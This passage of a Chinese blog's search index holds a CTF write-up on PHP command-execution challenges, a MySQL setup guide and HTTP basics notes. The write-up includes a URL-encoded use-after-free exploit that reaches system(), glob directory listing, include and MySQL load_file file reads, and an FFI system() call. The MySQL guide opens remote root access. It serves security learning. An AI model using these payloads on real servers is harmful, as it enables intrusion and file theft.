string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span><span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%24vuln%20%3d%20new%20vuln<span class="token punctuation">(</span><span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%24vuln-%3ea%20%3d%20%24arg%3b%20%20%20%20%20%7d%20%20%20%20%20%20if<span class="token punctuation">(</span>stristr<span class="token punctuation">(</span>php_os%2c%20<span class="token string">'win'</span><span class="token punctuation">))</span>%20%7b%20%20%20%20%20%20%20%20%20die<span class="token punctuation">(</span><span class="token string">'this%20poc%20is%20for%20*nix%20systems%20only.'</span><span class="token punctuation">)</span>%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24n_alloc%20%3d%2010%3b%20%20%20%20%20%20%24contiguous%20%3d%20%5b%5d%3b%20%20%20%20%20for<span class="token punctuation">(</span>%24i%20%3d%200%3b%20%24i%20%3c%20%24n_alloc%3b%20%24i%2b%2b<span class="token punctuation">)</span>%20%20%20%20%20%20%20%20%20%24contiguous%5b%5d%20%3d%20str_shuffle<span class="token punctuation">(</span><span class="token string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span><span class="token punctuation">)</span>%3b%20%20%20%20%20%20trigger_uaf<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>%3b%20%20%20%20%20%24abc%20%3d%20%24backtrace%5b1%5d%5b<span class="token string">'args'</span>%5d%5b0%5d%3b%20%20%20%20%20%20%24helper%20%3d%20new%20helper%3b%20%20%20%20%20%24helper-%3eb%20%3d%20function%20<span class="token punctuation">(</span>%24x<span class="token punctuation">)</span>%20%7b%20%7d%3b%20%20%20%20%20%20if<span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>%24abc<span class="token punctuation">)</span>%20%3d%3d%2079%20%7c%7c%20strlen<span class="token punctuation">(</span>%24abc<span class="token punctuation">)</span>%20%3d%3d%200<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20die<span class="token punctuation">(</span>%22uaf%20failed%22<span class="token punctuation">)</span>%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24closure_handlers%20%3d%20str2ptr<span class="token punctuation">(</span>%24abc%2c%200<span class="token punctuation">)</span>%3b%20%20%20%20%20%24php_heap%20%3d%20str2ptr<span class="token punctuation">(</span>%24abc%2c%200x58<span class="token punctuation">)</span>%3b%20%20%20%20%20%24abc_addr%20%3d%20%24php_heap%20-%200xc8%3b%20%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%200x60%2c%202<span class="token punctuation">)</span>%3b%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%200x70%2c%206<span class="token punctuation">)</span>%3b%20%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%200x10%2c%20%24abc_addr%20%2b%200x60<span class="token punctuation">)</span>%3b%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%200x18%2c%200xa<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%24closure_obj%20%3d%20str2ptr<span class="token punctuation">(</span>%24abc%2c%200x20<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%24binary_leak%20%3d%20leak<span class="token punctuation">(</span>%24closure_handlers%2c%208<span class="token punctuation">)</span>%3b%20%20%20%20%20if<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>%24base%20%3d%20get_binary_base<span class="token punctuation">(</span>%24binary_leak<span class="token punctuation">))</span><span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20die<span class="token punctuation">(</span>%22couldn<span class="token string">'t%20determine%20binary%20base%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24elf%20%3d%20parse_elf(%24base)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn'</span>t%20parse%20elf%20header%22<span class="token punctuation">)</span>%3b%20%20%20%20%20%7d%20%20%20%20%20%20if<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>%24basic_funcs%20%3d%20get_basic_funcs<span class="token punctuation">(</span>%24base%2c%20%24elf<span class="token punctuation">))</span><span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20die<span class="token punctuation">(</span>%22couldn<span class="token string">'t%20get%20basic_functions%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24zif_system%20%3d%20get_system(%24basic_funcs)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn'</span>t%20get%20zif_system%20address%22<span class="token punctuation">)</span>%3b%20%20%20%20%20%7d%20%20%20%20%20%20%20%24fake_obj_offset%20%3d%200xd0%3b%20%20%20%20%20for<span class="token punctuation">(</span>%24i%20%3d%200%3b%20%24i%20%3c%200x110%3b%20%24i%20%2b%3d%208<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%20%24fake_obj_offset%20%2b%20%24i%2c%20leak<span class="token punctuation">(</span>%24closure_obj%2c%20%24i<span class="token punctuation">))</span>%3b%20%20%20%20%20%7d%20%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%200x20%2c%20%24abc_addr%20%2b%20%24fake_obj_offset<span class="token punctuation">)</span>%3b%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%200xd0%20%2b%200x38%2c%201%2c%204<span class="token punctuation">)</span>%3b%20%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%200xd0%20%2b%200x68%2c%20%24zif_system<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20<span class="token punctuation">(</span>%24helper-%3eb<span class="token punctuation">)</span><span class="token punctuation">(</span>%24cmd<span class="token punctuation">)</span>%3b%20%20%20%20%20exit<span class="token punctuation">(</span><span class="token punctuation">)</span>%3b%20%7d%20%20ctfshow<span class="token punctuation">(</span>%22cat%20%2fflag0.txt%22<span class="token punctuation">)</span>%3bob_end_flush<span class="token punctuation">(</span><span class="token punctuation">)</span>%3b</code></pre><h1 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h1><p>老规矩先看目录</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span>new DirectoryIterator<span class="token punctuation">(</span><span class="token string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>foreach<span class="token punctuation">(</span><span class="token variable">$a</span> as <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo($f->__toString()." ");&amp;#125;;exit();</span></code></pre><p>flagc.txt</p><p>试试include能用不</p><p>Payload:</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>include<span class="token punctuation">(</span><span class="token string">"/flagc.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h1><p>老规矩先看目录</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span>new DirectoryIterator<span class="token punctuation">(</span><span class="token string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>foreach<span class="token punctuation">(</span><span class="token variable">$a</span> as <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo($f->__toString()." ");&amp;#125;;exit();</span></code></pre><p>flagx.txt</p><p>试试include能用不</p><p>Payload:</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>include<span class="token punctuation">(</span><span class="token string">"/flagx.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web75（未解决）"><a href="#Web75（未解决）" class="headerlink" title="Web75（未解决）"></a>Web75（未解决）</h1><p>老规矩先看目录</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span>new DirectoryIterator<span class="token punctuation">(</span><span class="token string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>foreach<span class="token punctuation">(</span><span class="token variable">$a</span> as <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo($f->__toString()." ");&amp;#125;;exit();</span></code></pre><p>flag36.txt</p><p>试试include能用不</p><p>又给禁用了</p><p>这次flag在flag36.txt里，好家伙又读取不成功开始限制了，后来看了下hint，这题用的mysql的load_file进行读取文件，</p><p>payload如下</p><pre class=" language-php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$dbh = new PDO(</span><span class="token string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;echo($row[0]).</span><span class="token string">"|"</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;$dbh = null;&amp;#125;catch (PDOException $e) &amp;#123;echo $e->getMessage();exit(0);&amp;#125;exit(0);</span></code></pre><p>url编码</p><p>按照大佬博客上说是能行，但是自己试了不行。。。</p><h1 id="Web76-未解决"><a href="#Web76-未解决" class="headerlink" title="Web76(未解决)"></a>Web76(未解决)</h1><p>跟上题一样</p><h1 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h1><p>还是先读取目录</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span>new DirectoryIterator<span class="token punctuation">(</span><span class="token string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>foreach<span class="token punctuation">(</span><span class="token variable">$a</span> as <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo($f->__toString()." ");&amp;#125;;exit();</span></code></pre><p>发现一个flag36x.txt和readflag，题目提示了php7.4，搜了一下是利用FF1拓展(php7.4开始才有)</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>?<span class="token operator">></span><span class="token operator">&lt;</span>?php <span class="token variable">$ffi</span> <span class="token operator">=</span> FFI::cdef<span class="token punctuation">(</span><span class="token string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ffi</span>-<span class="token operator">></span>system<span class="token punctuation">(</span><span class="token string">"/readflag >flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里flag36x.txt读取不出来没有回显，所以利用readflag那个文件，把他输出到新文件flag.txt中</p><p>直接访问flag.txt</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql使用记录</title>
      <link href="/2021/09/25/mysql-shi-yong-ji-lu/"/>
      <url>/2021/09/25/mysql-shi-yong-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>环境配置：</p><p>Ubuntu18.04</p><h1 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h1><p>首先将apt源进行更新</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update</code></pre><p>安装mysql服务</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> mysql-server -y</code></pre><p>安装完毕后，验证mysql版本</p><pre class=" language-bash"><code class="language-bash">mysql --version</code></pre><p><img src="https://gitee.com/AAWG/image/raw/master/202109121521352.png" alt="image-20210912152117316"></p><p>查看mysql服务状态</p><pre class=" language-bash"><code class="language-bash">systemctl status mysql.service <span class="token comment" spellcheck="true"># 查看mysql服务状态</span></code></pre><p><img src="https://gitee.com/AAWG/image/raw/master/202109121237329.png" alt="image-20210912123756301"></p><p>显示activate（runing）表示数据库已经启动</p><p>初始化配置</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> mysql_secure_installation</code></pre><p><img src="https://gitee.com/AAWG/image/raw/master/202109121320034.png" alt="image-20210912132034004"></p><p>选择N，不会进行密码的强校验</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109121321237.png" alt="image-20210912132108208"></p><p>输入密码，进行数据库root密码的设置</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109121321640.png" alt="image-20210912132147616"></p><p>选择Y，删除匿名用户</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109121322031.png" alt="image-20210912132237005"></p><p>选择n，允许root远程连接</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109121323164.png" alt="image-20210912132333138"></p><p>选择n，不删除test数据库</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109121326454.png" alt="image-20210912132657425"></p><p>选择Y，修改权限立即生效</p><p>配置远程访问</p><p>Ubuntu中，MySQL缺省是只允许本地访问的，使用远程数据管理工具是连不上的；如果想要其他机器进行访问，需要进行配置找到bind-address修改值为0.0.0.0</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vi</span> /etc/mysql/mysql.conf.d/mysqld.cnf</code></pre><p><img src="https://gitee.com/AAWG/image/raw/master/202109121329537.png" alt="image-20210912132905510"></p><p>保存，重启数据库</p><pre class=" language-bash"><code class="language-bash">systemctl restart mysql.service</code></pre><p><img src="https://gitee.com/AAWG/image/raw/master/202109121330235.png" alt="image-20210912133040209"></p><p>重点来了，如果说想要数据库能够远程连接，需要保证防火墙开启，3306端口，具体如何开启，请自己行百度，这里就不进行赘述了。</p><p>开启之后使用root远程连接会有1698问题</p><pre class=" language-mysql"><code class="language-mysql">select user, plugin from mysql.user;</code></pre><pre class=" language-bash"><code class="language-bash">+-----------+-----------------------+<span class="token operator">|</span> user      <span class="token operator">|</span> plugin                <span class="token operator">|</span>+-----------+-----------------------+<span class="token operator">|</span> root      <span class="token operator">|</span> auth_socket           <span class="token operator">||</span> mysql.sys <span class="token operator">|</span> mysql_native_password <span class="token operator">||</span> dev       <span class="token operator">|</span> mysql_native_password <span class="token operator">|</span>+-----------+-----------------------+3 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.01 sec<span class="token punctuation">)</span></code></pre><p>发现<code>root</code>的plugin是<code>auth_socket</code>需要将其改为<code>mysql_native_password</code></p><pre class=" language-mysql"><code class="language-mysql">mysql> update mysql.user set authentication_string=PASSWORD('newPwd'), plugin='mysql_native_password' where user='root';Query OK, 1 row affected, 1 warning (0.00 sec)Rows matched: 1  Changed: 1  Warnings: 1mysql> flush privileges;Query OK, 0 rows affected (0.00 sec)</code></pre><p>重启mysql服务</p><p>使用Navicat premium，进行测试</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109121549301.png" alt="image-20210912154941264"></p><p>连接成功，表示配置成功了</p><h1 id="MySQL简单操作"><a href="#MySQL简单操作" class="headerlink" title="MySQL简单操作"></a>MySQL简单操作</h1><p>Mysql状态的控制</p><pre class=" language-bash"><code class="language-bash">systemctl status mysql.service <span class="token comment" spellcheck="true"># 查看mysql服务状态systemctl start mysql.service # 启动mysql服务systemctl restart mysql.service # 重启mysql服务systemctl stop mysql.service # 关闭mysql服务</span></code></pre><p>登陆数据库</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> mysql -uroot -p</code></pre><p>切换数据库</p><pre class=" language-mysql"><code class="language-mysql">use xxx;(xxx为数据库的名)</code></pre><p>创建数据库</p><pre class=" language-mysql"><code class="language-mysql">create database xxx; -- 创建名为xxx的数据库</code></pre><p>创建只读用户</p><p>为xxx数据库创建用户名为username，密码为password的只读用户</p><pre class=" language-mysql"><code class="language-mysql">mysql > grant select on xxx.* to 'username'@'%' identify by "password";mysql > flush privileges;</code></pre><p>创建拥有读写权限的用户</p><pre class=" language-mysql"><code class="language-mysql">mysql > grant all privileges on xxx.* to 'username'@'%' identify by "password";mysql > flush privileges;</code></pre><h1 id="Mysql卸载"><a href="#Mysql卸载" class="headerlink" title="Mysql卸载"></a>Mysql卸载</h1><p>查看依赖</p><pre class=" language-bash"><code class="language-bash">dpkg --list<span class="token operator">|</span><span class="token function">grep</span> mysql</code></pre><p>获取一些依赖库的名</p><p>执行删除命令</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> remove xxxx<span class="token punctuation">(</span>xxx依次改为前面获取的依赖库的名<span class="token punctuation">)</span>sudo <span class="token function">apt-get</span> autoremove --purge xxxx<span class="token punctuation">(</span>xxx依次改为前面获取的依赖库的名<span class="token punctuation">)</span>sudo <span class="token function">apt-get</span> remove mysql-*sudo dpkg -l <span class="token operator">|</span><span class="token function">grep</span> ^rc<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&amp;#123;print <span class="token variable">$2</span>&amp;#125;'</span> <span class="token operator">|</span><span class="token function">sudo</span> <span class="token function">xargs</span> dpkg -P</code></pre>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
            <tag> mysql </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Web基础知识</title>
      <link href="/2021/09/24/ctf-web-ji-chu-zhi-shi/"/>
      <url>/2021/09/24/ctf-web-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><p>HTTP（HyperText Transfer Protocol）叫超文本传输协议，Web服务器和客户端直接进行数据传输的规则，是一个无状态的应用层协议</p></li><li><p>HTTPS（HyperText Transfer Protocol over SecureSocket Layer），以安全为目标的http通道，在http的基础上通过传输加密和身份认证保证了传输过程的安全性</p></li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>访问<a href="https://www.baidu.com/index.html%E5%90%8E%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%92%8CWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%A7%E8%A1%8C%E4%BB%A5%E4%B8%8B%E5%8A%A8%E4%BD%9C%EF%BC%9A">https://www.baidu.com/index.html后，浏览器和Web服务器执行以下动作：</a></p><ol><li><p>浏览器分析超链接中的URL</p></li><li><p>浏览器向DNS请求解析<a href="http://www.baidu.com的ip地址/">www.baidu.com的IP地址</a></p></li><li><p>DNS将解析出的IP地址220.181.38.148返回浏览器</p></li><li><p>浏览器与服务器建立TCP连接（443端口）</p></li><li><p>浏览器请求文档：GET /index.html</p></li><li><p>服务器给出响应，将文档index.html发送给浏览器</p></li><li><p>释放TCP连接</p></li><li><p>浏览器显示index.html中的内容</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109192006966.png" alt="image-20210919200613837"></p></li></ol><h2 id="持久性连接与非持久性连接"><a href="#持久性连接与非持久性连接" class="headerlink" title="持久性连接与非持久性连接"></a>持久性连接与非持久性连接</h2><h3 id="非持久性连接"><a href="#非持久性连接" class="headerlink" title="非持久性连接"></a>非持久性连接</h3><p>即浏览器每请求一个Web文档，就创建一个新的连接，当文档传输完毕后，连接就立刻被释放。</p><ul><li>HTTP 0.9、HTTP 1.0 采用此连接方式</li></ul><h3 id="持久性连接"><a href="#持久性连接" class="headerlink" title="持久性连接"></a>持久性连接</h3><p>一个连接中，可以进行多次文档的请求和响应。服务器在发送完响应后，并不立即释放连接，浏览器可以使用该连接继续请求其他文档。连接保持的时间可以由双方进行协商。</p><h2 id="HTTP报文结构"><a href="#HTTP报文结构" class="headerlink" title="HTTP报文结构"></a>HTTP报文结构</h2><p>请求报文</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109192016732.png" alt="image-20210919201642698"></p><p>响应报文</p><p><img src="https://gitee.com/AAWG/image/raw/master/202109192018373.png" alt="image-20210919201817338"></p><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><ol><li>GET：请求指定的页面信息，并返回实体主体</li><li>POST：向指定资源提交数据进行处理请求（提交表单或上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源建立或已有资源的修改</li><li>HEAD：与GET几乎一样，只是响应包中没有响应体，只有响应消息头中的元信息。</li><li>PUT：向指定资源位置上传其最新内容</li><li>DELETE：请求服务器删除Request-URI所标识的资源</li><li>OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向Web服务器发送<code>*</code>的请求来测试服务器的功能性</li><li>TRACE：回显服务器收到的请求，主要用于测试或诊断</li><li>CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</li></ol><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><table><thead><tr><th>状态码</th><th>响应类别</th><th>含义</th></tr></thead><tbody><tr><td>1xx</td><td>信息状态码</td><td>服务器正在处理请求</td></tr><tr><td>2xx</td><td>成功状态码</td><td>请求已正常处理完毕</td></tr><tr><td>3xx</td><td>重定向状态码</td><td>需要进行额外操作完成请求</td></tr><tr><td>4xx</td><td>客户端错误状态码</td><td>客户端原因导致服务器无法处理请求</td></tr><tr><td>5xx</td><td>服务器错误状态码</td><td>服务器原因导致处理请求出错</td></tr></tbody></table><table><thead><tr><th>状态码</th><th>含义</th><th>状态码</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>表示请求被服务器正常处理（最常见）</td><td>307</td><td>临时重定向，POST不会变成GET</td></tr><tr><td>204</td><td>表示请求已成功处理，但是没有内容返回</td><td>400</td><td>请求报文语法错误或参数错误</td></tr><tr><td>206</td><td>表示服务器已经完成了部分GET请求</td><td>401</td><td>需要通过HTTP认证，或认证失败，未授权访问居多</td></tr><tr><td>301</td><td>永久重定向，资源已永久分配新URL</td><td>403</td><td>请求资源被拒绝</td></tr><tr><td>302</td><td>临时重定向，资源已临时分配新URL</td><td>404</td><td>无法找到请求资源</td></tr><tr><td>303</td><td>临时重定向，期望使用GET定向获取</td><td>500</td><td>服务器故障或Web应用故障</td></tr><tr><td>304</td><td>发送的附带条件请求未满足</td><td>503</td><td>服务器超负荷或停机维护</td></tr></tbody></table><h2 id="HTTP头部"><a href="#HTTP头部" class="headerlink" title="HTTP头部"></a>HTTP头部</h2><p>请求头键值</p><table><thead><tr><th>头（Header）</th><th>说明</th></tr></thead><tbody><tr><td>User-Agent</td><td>关于浏览器和它平台的信息，如Mozilla4.0</td></tr><tr><td>Accept</td><td>客户能处理的页面的类型，如text/html</td></tr><tr><td>Accept-Charset</td><td>客户可以接受的字符集，如Unicode-1-1， UTF-8</td></tr><tr><td>Accept-Encoding</td><td>客户能处理的页面编码方法，如gzip</td></tr><tr><td>Accept-Language</td><td>客户能处理的自然语言，如en（英语），zh-cn（简体中文）</td></tr><tr><td>Host</td><td>服务器的DNS名称。从URL中提取出来，必需</td></tr><tr><td>Referer</td><td>用户从该URL代表的页面出发访问当前请求的页面</td></tr><tr><td>Cookie</td><td>将以前设置的Cookie送回服务器，可用来作为会话信息</td></tr><tr><td>Date</td><td>消息被发送时的日期和时间</td></tr></tbody></table><p>响应头键值</p><table><thead><tr><th>头（header）</th><th>说明</th></tr></thead><tbody><tr><td>Date</td><td>消息被发送时的日期和时间</td></tr><tr><td>Server</td><td>关于服务器的信息</td></tr><tr><td>Content-Encoding</td><td>内容是如何被编码的（如gzip）</td></tr><tr><td>Content-Language</td><td>页面所使用的自然语言</td></tr><tr><td>Content-Length</td><td>以字节计算的页面长度</td></tr><tr><td>Content-Type</td><td>页面的MIME类型</td></tr><tr><td>Last-Modified</td><td>页面最后被修改的时间和日期，在页面缓存机制中意义重大</td></tr><tr><td>Location</td><td>指示客户将请求发送给别处，即重定向到另一个URL</td></tr><tr><td>Set-Cookie</td><td>服务器希望客户保存一个Cookie</td></tr></tbody></table><h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>全称：Uniform Resource Location，统一资源定位符。从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的URL</p><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><p>协议://用户名:密码@子域名.域名.顶级域名:端口/目录/文件名.文件后缀?参数=值#标志</p><p>相对URL:/目录/文件名.文件后缀?参数=值#标志</p><p>例子:<a href="http://www.xxx.com/test/index.html?boardID=5&amp;ID=23445&amp;page=1#name">http://www.xxx.com:80/test/index.html?boardID=5&amp;ID=23445&amp;page=1#name</a></p><h2 id="URL常见协议"><a href="#URL常见协议" class="headerlink" title="URL常见协议"></a>URL常见协议</h2><p>http——超文本传输协议</p><p>https——用安全套接字层传送的超文本传输协议</p><p>ftp——文件传输协议</p><p>mailto——电子邮件地址</p><p>ldap——轻型目录访问协议搜索</p><p>file——当地电脑活网上分享的文件</p><p>news——Usenet新闻组</p><p>gopher——Gopher协议</p><p>telnet——Telnet协议</p><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><ul><li>只能使用ASCII字符集来通过因特网进行发送</li><li>URL编码使用<code>%</code>其后跟随两位的十六进制数来替换非ASCII自负</li><li>URL不能包含空格。URL编码通常使用+来替换空格</li><li>只有字母和数字[0-9a-zA-Z]、一些特殊符号<code>$-_.+!*&#39;(),</code>[不包含双引号]、以及某些保留字，才可以不经过编码直接用于URL</li></ul><h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>同源策略（SOP）</p><p>域名，协议，端口号三者相同</p><p>同源策略是浏览器的行为，是为了保护本地的策略不被JS代码获取回来的数据污染。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>如果没有同源设计策略，在A网站加载过的js脚本，就能够在没有加载过这个脚本B上的页面随意执行并被读取，这就可能造成页面混乱、被破坏以及数据窃取等不安全的行为</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
